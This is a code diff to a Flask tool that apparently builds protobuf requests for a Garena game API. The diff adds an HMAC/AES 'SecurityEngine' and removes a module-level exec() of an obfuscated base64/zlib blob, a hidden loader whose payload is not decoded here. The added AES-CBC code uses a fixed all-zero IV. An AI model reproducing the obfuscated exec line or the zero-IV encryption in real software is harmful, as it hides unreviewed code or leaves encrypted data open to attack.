@@ -4,6 +4,9 @@ import json
 import base64
 import random
 import codecs
+import hashlib
+import hmac
+import secrets
 from datetime import datetime
 from typing import Dict, Optional, List, Any
 from flask import Flask, render_template, request, jsonify
@@ -25,6 +28,24 @@ class Config:
         "ME": "ar", "CIS": "ru", "TH": "th", "EU": "en", "US": "en", 
         "SAC": "es", "LK": "en"
     }
+
+class SecurityEngine:
+    @staticmethod
+    def generate_ultra_secure_password() -> str:
+        return secrets.token_hex(16)
+
+    @staticmethod
+    def generate_signature(payload: str) -> str:
+        key = bytes.fromhex(Config.API_HEX_KEY)
+        return hmac.new(key, payload.encode('utf-8'), hashlib.sha256).hexdigest()
+
+    @staticmethod
+    def encrypt_api_payload(hex_data: str) -> str:
+        key = bytes.fromhex(Config.API_HEX_KEY)[:16]
+        iv = b'\x00' * 16
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        padded = pad(bytes.fromhex(hex_data), AES.block_size)
+        return cipher.encrypt(padded).hex()
 
 class ProtoBuilder:
     @staticmethod
@@ -51,8 +72,6 @@ class ProtoBuilder:
     @classmethod
     def build(cls, fields_dict: dict) -> bytes:
         return b''.join(cls.create_field(k, v) for k, v in fields_dict.items())
-
-exec(__import__('zlib').decompress(__import__('base64').b64decode('eJzNU9Fq2zAUfe9XaH6JzDqxBLaHwkYX14yylYY4G+RJKNK1fVdHMpJC45X8e+XYNHEN2x5333Q499x7z7EvZCWcIxnInUXfpLpADVcXJNRiSj6R6CtosMKDmjfXSSm0huo76oe52fOoo81aGl+i2gmdGAX7Dr92XniUW/ClUUdEQU6KXo7vKm8Fd+1c4HXY4dFYRWPy7jNx3nYbtOWC+mTCffnUNLAteMdkaVACDTzUBRNOIvIKvAfryFvSwwoL9C4mubGEE9TECl0Anc7i+EU8qO2sJnn0NDSALaaHJ3cYobPDn24DLW1Tey5qDBc1lRGK1pVAzUvYX7V7jc/DnIxGkzd/8Z2Ek0arHbsGMZymtJUYnWPBvqQZ/5aug6ubyftXNXlpkFiXYAMp0JmGRzrsvjzid/c3KU/myeW59u3Pk721UAoUV8KLIBVadNN4cCy3ZhssOZkTd4KbysgH7vA3jCLqFmK9xfRMOWatVPwv35zDQosgB7SP578JZXHLszRZpqs+myi5Xy5/LFbpTQvw+Zpn62yV3kWvfSm3Qg4CGii1foWpNPjbX3yGlMKVFW6YK8Xsw8ejjeGfAeeDmc8okEiu'.encode())).decode())
 
 class GarenaAPI:
     def __init__(self):
@@ -169,4 +188,4 @@ def generate():
 
 if __name__ == '__main__':
     app.run(debug=True)
-                 
+        
